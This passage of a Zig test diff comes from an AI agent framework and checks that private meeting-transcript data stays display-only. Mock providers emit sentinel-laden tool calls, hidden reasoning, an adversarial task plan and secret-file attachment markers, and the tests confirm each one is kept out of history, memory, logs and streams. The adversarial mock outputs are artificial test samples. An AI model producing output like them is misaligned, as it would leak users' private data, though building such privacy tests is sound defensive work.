+
+    const allocator = std.testing.allocator;
+    var provider_state = UnsafeProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = UnsafeProvider.chatWithSystem,
+        .chat = UnsafeProvider.chat,
+        .supportsNativeTools = UnsafeProvider.supportsNativeTools,
+        .supports_streaming = UnsafeProvider.supportsStreaming,
+        .stream_chat = UnsafeProvider.streamChat,
+        // Deliberately no sensitive-streaming declaration.
+        .getName = UnsafeProvider.getName,
+        .deinit = UnsafeProvider.deinitFn,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+    const probe = providers.ChatRequest{
+        .messages = &.{},
+        .model = "test-model",
+        .provider_selection_policy = .exact_primary_and_model,
+    };
+    try std.testing.expect(!provider.supportsSensitiveStreamingForRequest(probe));
+
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    const tool_list = [_]Tool{minutes_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var noop = observability.NoopObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "test-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 3,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+    };
+    defer agent.deinit();
+
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+    var outcome = try agent.turnOutcome("Summarize my last meeting.");
+    defer outcome.deinit(allocator);
+
+    try std.testing.expectEqual(Agent.ReplyDataPolicy.ordinary, outcome.reply_data_policy);
+    try std.testing.expectEqualStrings("Minutes is unavailable on this provider route.", outcome.text);
+    try std.testing.expectEqual(@as(usize, 2), provider_state.call_count);
+    try std.testing.expect(provider_state.saw_filtered_surface);
+    try std.testing.expectEqual(@as(usize, 0), minutes_tool.call_count);
+    try std.testing.expect(tools_mod.getTurnContext().minutes_read_budget == &minutes_budget);
+    for (agent.history.items) |message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    }
+}
+
+test "parallel dispatch cannot execute Minutes without request capability" {
+    const allocator = std.testing.allocator;
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    var runtime_tool = CountingRuntimeInfoTool{};
+    const tool_list = [_]Tool{ minutes_tool.tool(), runtime_tool.tool() };
+
+    var agent = try makeTestAgent(allocator);
+    allocator.free(agent.tool_specs);
+    agent.tools = &tool_list;
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{
+            .name = tool.name(),
+            .description = tool.description(),
+            .parameters_json = tool.parametersJson(),
+        };
+    }
+    agent.tool_specs = specs;
+    defer agent.deinit();
+
+    tools_mod.setTurnContext(.{ .origin = .user, .minutes_read_budget = null });
+    defer tools_mod.clearTurnContext();
+    const calls = [_]ParsedToolCall{
+        .{ .name = MinutesForegroundSentinelTool.tool_name, .arguments_json = "{}", .tool_call_id = "minutes-parallel" },
+        .{ .name = CountingRuntimeInfoTool.tool_name, .arguments_json = "{}", .tool_call_id = "runtime-parallel" },
+    };
+    var arena = std.heap.ArenaAllocator.init(allocator);
+    defer arena.deinit();
+    var results: std.ArrayListUnmanaged(ToolExecutionResult) = .empty;
+    defer results.deinit(allocator);
+
+    try agent.executeToolCallsParallel(arena.allocator(), 0, &calls, &results);
+    try std.testing.expectEqual(@as(usize, 2), results.items.len);
+    try std.testing.expect(!results.items[0].success);
+    try std.testing.expectEqualStrings(MINUTES_CAPABILITY_BLOCKED_OUTPUT, results.items[0].output);
+    try std.testing.expect(results.items[1].success);
+    try std.testing.expectEqual(@as(usize, 0), minutes_tool.call_count);
+    try std.testing.expectEqual(@as(usize, 1), runtime_tool.call_count);
+}
+
+test "cancellation after parsed call cleanup retains canonical tool name" {
+    const CancellingRuntimeTool = struct {
+        token: *CancellationToken,
+        call_count: usize = 0,
+
+        pub const tool_name = "runtime_info";
+        pub const tool_description = "Cancel after a deterministic test call";
+        pub const tool_params = "{}";
+        pub const vtable = tools_mod.ToolVTable(@This());
+
+        pub fn tool(self: *@This()) Tool {
+            return .{ .ptr = @ptrCast(self), .vtable = &vtable };
+        }
+
+        pub fn execute(self: *@This(), allocator: std.mem.Allocator, _: tools_mod.JsonObjectMap) !tools_mod.ToolResult {
+            self.call_count += 1;
+            self.token.cancel();
+            return .{
+                .success = true,
+                .output = try allocator.dupe(u8, "runtime-info-before-cancel"),
+            };
+        }
+    };
+
+    const CancelAfterToolProvider = struct {
+        call_count: usize = 0,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(ptr: *anyopaque, allocator: std.mem.Allocator, _: providers.ChatRequest, _: []const u8, _: f64) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (self.call_count != 1) return error.UnexpectedProviderRoundtrip;
+
+            const calls = try allocator.alloc(providers.ToolCall, 1);
+            calls[0] = .{
+                .id = try allocator.dupe(u8, "cancel-after-cleanup"),
+                // Deliberately provider-owned: iteration cleanup frees this
+                // copy before the cancellation message is built.
+                .name = try allocator.dupe(u8, CancellingRuntimeTool.tool_name),
+                .arguments = try allocator.dupe(u8, "{}"),
+            };
+            return .{
+                .content = try allocator.dupe(u8, "running once"),
+                .tool_calls = calls,
+                .usage = .{},
+                .model = try allocator.dupe(u8, "test-model"),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "cancel-after-tool-provider";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = CancelAfterToolProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = CancelAfterToolProvider.chatWithSystem,
+        .chat = CancelAfterToolProvider.chat,
+        .supportsNativeTools = CancelAfterToolProvider.supportsNativeTools,
+        .getName = CancelAfterToolProvider.getName,
+        .deinit = CancelAfterToolProvider.deinitFn,
+    };
+    var noop = observability.NoopObserver{};
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = .{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable },
+        .tools = &.{},
+        .tool_specs = try allocator.alloc(ToolSpec, 0),
+        .mem = null,
+        .observer = noop.observer(),
+        .model_name = "test-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 4,
+        .max_history_messages = 50,
+        .auto_save = false,
+        .history = .empty,
+        .total_tokens = 0,
+        .has_system_prompt = false,
+    };
+
+    var cancelling_tool = CancellingRuntimeTool{ .token = &agent.cancellation_token };
+    const tool_list = [_]Tool{cancelling_tool.tool()};
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{
+            .name = tool.name(),
+            .description = tool.description(),
+            .parameters_json = tool.parametersJson(),
+        };
+    }
+    allocator.free(agent.tool_specs);
+    agent.tools = &tool_list;
+    agent.tool_specs = specs;
+    defer agent.deinit();
+
+    var outcome = try agent.turnOutcome("Run runtime_info once, then cancel.");
+    defer outcome.deinit(allocator);
+
+    try std.testing.expectEqualStrings("[Cancelled: last tool was runtime_info]", outcome.text);
+    try std.testing.expectEqual(@as(usize, 1), provider_state.call_count);
+    try std.testing.expectEqual(@as(usize, 1), cancelling_tool.call_count);
+    try std.testing.expectEqualStrings(CountingRuntimeInfoTool.tool_name, agent.last_executed_tool);
+}
+
+// Minutes-derived model text is display-only. Neither direct tool/intermediary
+// artifacts nor the final visible synthesis may enter history, session replay,
+// compaction, or generic extraction.
+fn assertMinutesDirectForegroundArtifactsAreAbsent(agent: *Agent, allocator: std.mem.Allocator, final_text: []const u8) !void {
+    for (agent.history.items) |*message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+        try std.testing.expect(!std.mem.eql(u8, message.content, final_text));
+        try std.testing.expectEqual(@as(usize, 0), message.tool_calls.len);
+        if (message.reasoning) |reasoning| {
+            try std.testing.expect(std.mem.indexOf(u8, reasoning, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+        }
+        const extraction_message = message.toExtractionMessage();
+        try std.testing.expect(std.mem.indexOf(u8, extraction_message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+        try std.testing.expect(std.mem.indexOf(u8, extraction_message.content, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+        try std.testing.expect(!std.mem.eql(u8, extraction_message.content, final_text));
+    }
+
+    const persisted = try agent.getHistory(allocator);
+    defer allocator.free(persisted);
+    for (persisted) |message| {
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+        try std.testing.expect(std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+        try std.testing.expect(!std.mem.eql(u8, message.content, final_text));
+    }
+
+    const extras = try agent.lastAssistantTranscriptExtras(allocator);
+    defer if (extras.tool_calls_json) |json| allocator.free(json);
+    try std.testing.expect(extras.tool_calls_json == null);
+    try std.testing.expect(extras.reasoning == null);
+
+    const frames = try narration.recallRecent(&agent.narration_ring_buffer, allocator, narration.RING_BUFFER_CAPACITY);
+    defer {
+        for (frames) |*frame| frame.deinit(allocator);
+        allocator.free(frames);
+    }
+    for (frames) |frame| {
+        try std.testing.expect(!MinutesPrivacyObserver.containsSensitive(frame.message));
+    }
+}
+
+test "minutes_read native streaming turn discards adversarial task plan and preserves mixed tool order" {
+    const StreamRecorder = struct {
+        chunks: std.ArrayListUnmanaged(u8) = .empty,
+        final_count: usize = 0,
+
+        fn onChunk(ctx: *anyopaque, chunk: providers.StreamChunk) void {
+            const self: *@This() = @ptrCast(@alignCast(ctx));
+            if (chunk.is_final) {
+                self.final_count += 1;
+                return;
+            }
+            self.chunks.appendSlice(std.testing.allocator, chunk.delta) catch {};
+        }
+
+        fn deinit(self: *@This()) void {
+            self.chunks.deinit(std.testing.allocator);
+        }
+    };
+
+    const NativeProvider = struct {
+        call_count: usize = 0,
+        preflight_call_count: usize = 0,
+        preflight_saw_sensitive: bool = false,
+        saw_same_turn_minutes: bool = false,
+        saw_mixed_order: bool = false,
+        saw_initial_cache_key: bool = false,
+        foreground_cache_disabled_count: usize = 0,
+        saw_durable_media_after_minutes: bool = false,
+        saw_blocked_result_pairing: bool = false,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(_: *anyopaque, _: std.mem.Allocator, _: providers.ChatRequest, _: []const u8, _: f64) anyerror!providers.ChatResponse {
+            return error.UnexpectedBlockingChat;
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            effective_model: []const u8,
+            _: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.call_count += 1;
+            if (request.provider_selection_policy != .exact_primary_and_model) {
+                return error.TestUnexpectedResult;
+            }
+            if (!std.mem.eql(u8, request.model, "kimi-k2.6") or
+                !std.mem.eql(u8, effective_model, "kimi-k2.6"))
+            {
+                return error.TestUnexpectedResult;
+            }
+
+            if (self.call_count == 1) {
+                if (request.prompt_cache_key == null) return error.TestUnexpectedResult;
+                self.saw_initial_cache_key = true;
+                const calls = try allocator.alloc(providers.ToolCall, 3);
+                calls[0] = .{
+                    .id = try allocator.dupe(u8, "blocked-id-" ++ MINUTES_FOREGROUND_RAW_SENTINEL),
+                    .name = try allocator.dupe(u8, MinutesBlockedSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"value\":\"" ++ MINUTES_FOREGROUND_RAW_SENTINEL ++ "\"}"),
+                };
+                calls[1] = .{
+                    .id = try allocator.dupe(u8, "minutes-id-" ++ MINUTES_FOREGROUND_RAW_SENTINEL),
+                    .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"action\":\"index\"}"),
+                };
+                calls[2] = .{
+                    .id = try allocator.dupe(u8, "runtime-id-" ++ MINUTES_FOREGROUND_RAW_SENTINEL),
+                    .name = try allocator.dupe(u8, CountingRuntimeInfoTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"value\":\"" ++ MINUTES_FOREGROUND_RAW_SENTINEL ++ "\"}"),
+                };
+                // The first tool-bearing response arrives before the turn loop
+                // can parse and latch Minutes. It still must not stream clean-
+                // looking intermediary/reasoning text to the user.
+                callback(callback_ctx, providers.StreamChunk.textDelta(MINUTES_FOREGROUND_REASONING_SENTINEL));
+                callback(callback_ctx, providers.StreamChunk.finalChunk());
+                return .{
+                    .content = try std.fmt.allocPrint(
+                        allocator,
+                        "<task_plan>\n<summary>Keep {s} in durable plan state</summary>\n" ++
+                            "<step>Read {s} safely</step>\n</task_plan>\nReading the meeting.",
+                        .{ MINUTES_FOREGROUND_RAW_SENTINEL, MINUTES_FOREGROUND_RAW_SENTINEL },
+                    ),
+                    .tool_calls = calls,
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "kimi-k2.6"),
+                    .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+                };
+            }
+
+            if (request.prompt_cache_key != null) return error.TestUnexpectedResult;
+            self.foreground_cache_disabled_count += 1;
+            if (!minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) {
+                return error.TestUnexpectedResult;
+            }
+            self.saw_same_turn_minutes = true;
+
+            var runtime_index: ?usize = null;
+            var minutes_index: ?usize = null;
+            var blocked_index: ?usize = null;
+            var blocked_result_count: usize = 0;
+            var durable_media_present = false;
+            for (request.messages, 0..) |message, i| {
+                if (std.mem.indexOf(u8, message.content, MINUTES_DURABLE_MEDIA_SENTINEL) != null and
+                    message.content_parts != null)
+                {
+                    durable_media_present = true;
+                }
+                if (std.mem.indexOf(u8, message.content, MINUTES_FOREGROUND_RAW_SENTINEL) != null and
+                    message.content_parts != null)
+                {
+                    return error.TestUnexpectedResult;
+                }
+                if (message.role != .tool or message.name == null) continue;
+                if (!std.mem.eql(u8, message.name.?, MinutesForegroundSentinelTool.tool_name)) {
+                    blocked_result_count += 1;
+                    if (std.mem.indexOf(u8, message.content, "blocked after minutes_read") == null) {
+                        return error.TestUnexpectedResult;
+                    }
+                }
+                if (std.mem.eql(u8, message.name.?, CountingRuntimeInfoTool.tool_name) and runtime_index == null) runtime_index = i;
+                if (std.mem.eql(u8, message.name.?, MinutesForegroundSentinelTool.tool_name) and minutes_index == null) minutes_index = i;
+                if (std.mem.eql(u8, message.name.?, MinutesBlockedSentinelTool.tool_name) and blocked_index == null) blocked_index = i;
+            }
+            if (blocked_index == null or minutes_index == null or runtime_index == null or
+                blocked_index.? >= minutes_index.? or minutes_index.? >= runtime_index.?)
+            {
+                return error.TestUnexpectedResult;
+            }
+            if (blocked_result_count < 2) return error.TestUnexpectedResult;
+            if (!durable_media_present) return error.TestUnexpectedResult;
+            self.saw_durable_media_after_minutes = true;
+            self.saw_blocked_result_pairing = true;
+            self.saw_mixed_order = true;
+
+            if (self.call_count == 2) {
+                const calls = try allocator.alloc(providers.ToolCall, 2);
+                calls[0] = .{
+                    .id = try allocator.dupe(u8, "minutes-second-id-" ++ MINUTES_FOREGROUND_RAW_SENTINEL),
+                    .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"action\":\"item\",\"item_id\":\"meeting-2\",\"variant\":\"full\"}"),
+                };
+                calls[1] = .{
+                    .id = try allocator.dupe(u8, "runtime-after-id-" ++ MINUTES_FOREGROUND_RAW_SENTINEL),
+                    .name = try allocator.dupe(u8, CountingRuntimeInfoTool.tool_name),
+                    .arguments = try allocator.dupe(u8, "{\"value\":\"" ++ MINUTES_FOREGROUND_RAW_SENTINEL ++ "\"}"),
+                };
+                // This simulates a provider streaming hidden reasoning before
+                // returning another tool call. Strict foreground hold must keep
+                // both the delta and the accumulated response off the callback.
+                callback(callback_ctx, providers.StreamChunk.textDelta(MINUTES_FOREGROUND_REASONING_SENTINEL));
+                callback(callback_ctx, providers.StreamChunk.finalChunk());
+                return .{
+                    .content = try allocator.dupe(u8, "Checking one more detail."),
+                    .tool_calls = calls,
+                    .usage = .{},
+                    .model = try allocator.dupe(u8, "kimi-k2.6"),
+                    .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+                };
+            }
+
+            callback(callback_ctx, providers.StreamChunk.textDelta(
+                "Public meeting summary. [AUDIO:/absolute/secret.mp3] [fIlE:/absolute/secret.pdf]",
+            ));
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = try allocator.dupe(
+                    u8,
+                    "Public meeting summary. [AUDIO:/absolute/secret.mp3] [fIlE:/absolute/secret.pdf]",
+                ),
+                .tool_calls = &.{},
+                .usage = .{},
+                .model = try allocator.dupe(u8, "kimi-k2.6"),
+                .reasoning_content = try allocator.dupe(u8, MINUTES_FOREGROUND_REASONING_SENTINEL),
+            };
+        }
+
+        fn supportsNativeTools(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn supportsStreaming(_: *anyopaque) bool {
+            return true;
+        }
+
+        fn estimateTokens(
+            ptr: *anyopaque,
+            _: std.mem.Allocator,
+            request: providers.ChatRequest,
+            _: []const u8,
+        ) anyerror!providers.TokenEstimateResult {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.preflight_call_count += 1;
+            if (minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL)) {
+                self.preflight_saw_sensitive = true;
+            }
+            return .{ .prompt_tokens = 1 };
+        }
+
+        fn getName(_: *anyopaque) []const u8 {
+            return "openai-minutes-foreground-test";
+        }
+
+        fn deinitFn(_: *anyopaque) void {}
+    };
+
+    const allocator = std.testing.allocator;
+    var provider_state = NativeProvider{};
+    const provider_vtable = Provider.VTable{
+        .chatWithSystem = NativeProvider.chatWithSystem,
+        .chat = NativeProvider.chat,
+        .supportsNativeTools = NativeProvider.supportsNativeTools,
+        .supports_sensitive_streaming_for_request = supportsSensitiveTestStreaming,
+        .getName = NativeProvider.getName,
+        .deinit = NativeProvider.deinitFn,
+        .supports_streaming = NativeProvider.supportsStreaming,
+        .stream_chat = NativeProvider.streamChat,
+        .estimate_tokens = NativeProvider.estimateTokens,
+    };
+    const provider = Provider{ .ptr = @ptrCast(&provider_state), .vtable = &provider_vtable };
+
+    var runtime_tool = CountingRuntimeInfoTool{};
+    var minutes_tool = MinutesForegroundSentinelTool{};
+    // The malicious downstream name is deliberately NOT registered. If the
+    // foreground fence ever invokes preflight, conservative metadata would
+    // raise a supervised approval containing the sentinel.
+    const tool_list = [_]Tool{ runtime_tool.tool(), minutes_tool.tool() };
+    const specs = try allocator.alloc(ToolSpec, tool_list.len);
+    for (tool_list, 0..) |tool, i| {
+        specs[i] = .{ .name = tool.name(), .description = tool.description(), .parameters_json = tool.parametersJson() };
+    }
+
+    var observer = MinutesPrivacyObserver{};
+    var stream_recorder = StreamRecorder{};
+    defer stream_recorder.deinit();
+    const TtsSpy = struct {
+        var call_count: usize = 0;
+
+        fn synth(
+            allocator_: std.mem.Allocator,
+            _: []const u8,
+            _: []const u8,
+            _: []const u8,
+            _: voice_mod.SynthesizeOptions,
+        ) voice_mod.SynthesizeError![]u8 {
+            call_count += 1;
+            return allocator_.dupe(u8, "/tmp/minutes-foreground-tts.mp3");
+        }
+    };
+    TtsSpy.call_count = 0;
+    const configured_providers = [_]config_types.ProviderEntry{
+        .{ .name = "openai", .api_key = "test-openai-key" },
+    };
+    const policy = SecurityPolicy{ .autonomy = .supervised, .workspace_dir = "/tmp" };
+    var autosave_memory = memory_mod.InMemoryLruMemory.init(allocator, 32);
+    defer autosave_memory.deinit();
+    var agent = Agent{
+        .allocator = allocator,
+        .provider = provider,
+        .tools = &tool_list,
+        .tool_specs = specs,
+        .mem = autosave_memory.memory(),
+        .observer = observer.observer(),
+        .model_name = "kimi-k2.6",
+        .vision_fallback_model = "unapproved-vision-model",
+        .temperature = 0.7,
+        .workspace_dir = "/tmp",
+        .max_tool_iterations = 5,
+        .max_history_messages = 50,
+        .auto_save = true,
+        .reasoning_mode = .on,
+        .history = .empty,
+        .memory_session_id = "minutes-cache-test",
+        .stream_callback = StreamRecorder.onChunk,
+        .stream_ctx = @ptrCast(&stream_recorder),
+        .narration_ring_buffer = narration.NarrationRingBuffer.init(allocator),
+        .policy = &policy,
+        .configured_providers = &configured_providers,
+        .tts_mode = .always,
+        .tts_audio = true,
+        .tts_provider = "openai",
+        .tts_synthesize_fn = TtsSpy.synth,
+    };
+    defer agent.deinit();
+
+    agent.session_last_goal_status = .met;
+    agent.session_reflection_trail_json = try allocator.dupe(u8, "prior-safe-reflection");
+    agent.active_task_plan = (try task_planner.parseTaskPlan(
+        allocator,
+        "<task_plan><summary>Existing safe plan</summary><step>Keep pending</step></task_plan>",
+    )).?;
+
+    tools_mod.setMessageTurnContext(.{
+        .channel = "telegram",
+        .chat_id = "minutes-foreground-test",
+        .is_group = false,
+        .is_dm = true,
+    });
+    defer tools_mod.clearMessageTurnContext();
+    var minutes_budget = tools_mod.MinutesReadTurnBudget{};
+    installMinutesTestTurnContext(&minutes_budget);
+    defer tools_mod.clearTurnContext();
+
+    var outcome = try agent.turnOutcome(
+        MINUTES_DURABLE_MEDIA_SENTINEL ++
+            " [IMAGE:data:image/png;base64,iVBORw0KGgo=] Summarize my last meeting.",
+    );
+    defer outcome.deinit(allocator);
+    const response = outcome.text;
+
+    try std.testing.expectEqualStrings(
+        "Public meeting summary. [attachment omitted] [attachment omitted]",
+        response,
+    );
+    try std.testing.expectEqual(Agent.ReplyDataPolicy.minutes_display_only, outcome.reply_data_policy);
+    try std.testing.expectEqual(@as(usize, 3), provider_state.call_count);
+    try std.testing.expectEqual(@as(usize, 0), provider_state.preflight_call_count);
+    try std.testing.expect(!provider_state.preflight_saw_sensitive);
+    try std.testing.expect(provider_state.saw_same_turn_minutes);
+    try std.testing.expect(provider_state.saw_mixed_order);
+    try std.testing.expect(provider_state.saw_initial_cache_key);
+    try std.testing.expectEqual(@as(usize, 2), provider_state.foreground_cache_disabled_count);
+    try std.testing.expect(provider_state.saw_durable_media_after_minutes);
+    try std.testing.expect(provider_state.saw_blocked_result_pairing);
+    try std.testing.expectEqual(@as(usize, 0), runtime_tool.call_count);
+    try std.testing.expectEqual(@as(usize, 2), minutes_tool.call_count);
+    try std.testing.expectEqual(@as(usize, 0), TtsSpy.call_count);
+    try std.testing.expect(std.mem.indexOf(u8, response, "[AUDIO:") == null);
+    try std.testing.expect(agent.pending_tool_approval == null);
+    try std.testing.expectEqualStrings(
+        "Public meeting summary. [attachment omitted] [attachment omitted]",
+        stream_recorder.chunks.items,
+    );
+    try std.testing.expectEqual(@as(usize, 1), stream_recorder.final_count);
+    try std.testing.expect(std.mem.indexOf(u8, stream_recorder.chunks.items, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    try std.testing.expect(std.mem.indexOf(u8, stream_recorder.chunks.items, MINUTES_FOREGROUND_REASONING_SENTINEL) == null);
+    try std.testing.expect(!agent.last_prompt_shape.available);
+    try std.testing.expectEqual(@as(u64, 0), agent.last_prompt_shape.full_request_hash);
+    try std.testing.expectEqual(@as(u64, 0), agent.last_prompt_shape.provider_request_body_bytes_estimated);
+    try std.testing.expect(!agent.last_prompt_shape.prompt_cache_key_present);
+    try std.testing.expect(observer.saw_minutes_start);
+    try std.testing.expect(observer.saw_minutes_result);
+    try std.testing.expect(!observer.saw_input_preview);
+    try std.testing.expect(!observer.saw_output_preview);
+    try std.testing.expect(!observer.saw_sensitive_narration);
+    try std.testing.expect(!observer.saw_sensitive_observer);
+    try std.testing.expect(!observer.saw_non_minutes_start);
+    try std.testing.expect(!observer.saw_non_minutes_result);
+    try std.testing.expect(!observer.saw_plan_created);
+    try std.testing.expectEqual(goal_loop.GoalStatus.met, agent.session_last_goal_status.?);
+    try std.testing.expectEqualStrings("prior-safe-reflection", agent.session_reflection_trail_json.?);
+    try std.testing.expect(agent.active_task_plan != null);
+    try std.testing.expectEqual(@as(u32, 0), agent.active_task_plan.?.current_step);
+    try std.testing.expectEqual(task_planner.StepStatus.pending, agent.active_task_plan.?.steps[0].status);
+    for (agent.session_tool_names.items) |tool_name| {
+        try std.testing.expect(std.mem.indexOf(u8, tool_name, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    }
+    if (agent.session_reflection_trail_json) |trail| {
+        try std.testing.expect(std.mem.indexOf(u8, trail, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+    }
+    if (agent.active_task_plan) |*plan| {
+        for (plan.steps) |step| {
+            if (step.actual_tool) |tool_name| {
+                try std.testing.expect(std.mem.indexOf(u8, tool_name, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+            }
+            if (step.result_summary) |result_summary| {
+                try std.testing.expect(std.mem.indexOf(u8, result_summary, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+            }
+            if (step.error_summary) |error_summary| {
+                try std.testing.expect(std.mem.indexOf(u8, error_summary, MINUTES_FOREGROUND_RAW_SENTINEL) == null);
+            }
+        }
+    }
+    try assertMinutesDirectForegroundArtifactsAreAbsent(
+        &agent,
+        allocator,
+        "Public meeting summary. [attachment omitted] [attachment omitted]",
+    );
+
+    const autosaves = try autosave_memory.memory().list(allocator, .conversation, agent.memory_session_id);
+    defer memory_mod.freeEntries(allocator, autosaves);
+    for (autosaves) |entry| {
+        try std.testing.expect(!std.mem.startsWith(u8, entry.key, "autosave_assistant_"));
+        try std.testing.expect(std.mem.indexOf(u8, entry.content, "Public meeting summary") == null);
+    }
+}
+
+test "minutes_read streaming exhaustion holds preamble so gateway replays blocking summary" {
+    const StreamRecorder = struct {
+        chunks: std.ArrayListUnmanaged(u8) = .empty,
+        final_count: usize = 0,
+
+        fn onChunk(ctx: *anyopaque, chunk: providers.StreamChunk) void {
+            const self: *@This() = @ptrCast(@alignCast(ctx));
+            if (chunk.is_final) {
+                self.final_count += 1;
+                return;
+            }
+            self.chunks.appendSlice(std.testing.allocator, chunk.delta) catch {};
+        }
+
+        fn deinit(self: *@This()) void {
+            self.chunks.deinit(std.testing.allocator);
+        }
+    };
+
+    const ExhaustionProvider = struct {
+        stream_call_count: usize = 0,
+        summary_call_count: usize = 0,
+
+        fn chatWithSystem(_: *anyopaque, allocator: std.mem.Allocator, _: ?[]const u8, _: []const u8, _: []const u8, _: f64) anyerror![]const u8 {
+            return allocator.dupe(u8, "");
+        }
+
+        fn chat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            effective_model: []const u8,
+            _: f64,
+        ) anyerror!providers.ChatResponse {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            self.summary_call_count += 1;
+            if (request.provider_selection_policy != .exact_primary_and_model or
+                request.tools != null or
+                !minutesTestRequestContains(request, MINUTES_FOREGROUND_RAW_SENTINEL) or
+                !std.mem.eql(u8, request.model, "kimi-k2.6") or
+                !std.mem.eql(u8, effective_model, "kimi-k2.6"))
+            {
+                return error.TestUnexpectedResult;
+            }
+            return .{
+                .content = try allocator.dupe(
+                    u8,
+                    "Public exhaustion summary. [VIDEO:/absolute/secret.mp4]",
+                ),
+                .tool_calls = &.{},
+                .usage = .{},
+                .model = try allocator.dupe(u8, "kimi-k2.6"),
+            };
+        }
+
+        fn streamChat(
+            ptr: *anyopaque,
+            allocator: std.mem.Allocator,
+            request: providers.ChatRequest,
+            effective_model: []const u8,
+            _: f64,
+            callback: providers.StreamCallback,
+            callback_ctx: *anyopaque,
+        ) anyerror!providers.StreamChatResult {
+            const self: *@This() = @ptrCast(@alignCast(ptr));
+            if (request.tools == null) {
+                const response = try chat(ptr, allocator, request, effective_model, 0.7);
+                return .{
+                    .content = response.content,
+                    .tool_calls = response.tool_calls,
+                    .usage = response.usage,
+                    .model = response.model,
+                    .reasoning_content = response.reasoning_content,
+                    .stream_tool_call_chunks = response.stream_tool_call_chunks,
+                };
+            }
+            self.stream_call_count += 1;
+            if (request.provider_selection_policy != .exact_primary_and_model) {
+                return error.TestUnexpectedResult;
+            }
+            if (!std.mem.eql(u8, request.model, "kimi-k2.6") or
+                !std.mem.eql(u8, effective_model, "kimi-k2.6"))
+            {
+                return error.TestUnexpectedResult;
+            }
+            const calls = try allocator.alloc(providers.ToolCall, 1);
+            calls[0] = .{
+                .id = try allocator.dupe(u8, "minutes-exhaustion-id"),
+                .name = try allocator.dupe(u8, MinutesForegroundSentinelTool.tool_name),
+                .arguments = try allocator.dupe(u8, "{\"action\":\"index\"}"),
+            };
+            callback(callback_ctx, providers.StreamChunk.textDelta("Reading the meeting; this preamble must stay held."));
+            callback(callback_ctx, providers.StreamChunk.finalChunk());
+            return .{
+                .content = try allocator.dupe(u8, "Reading the meeting; this preamble must stay held."),
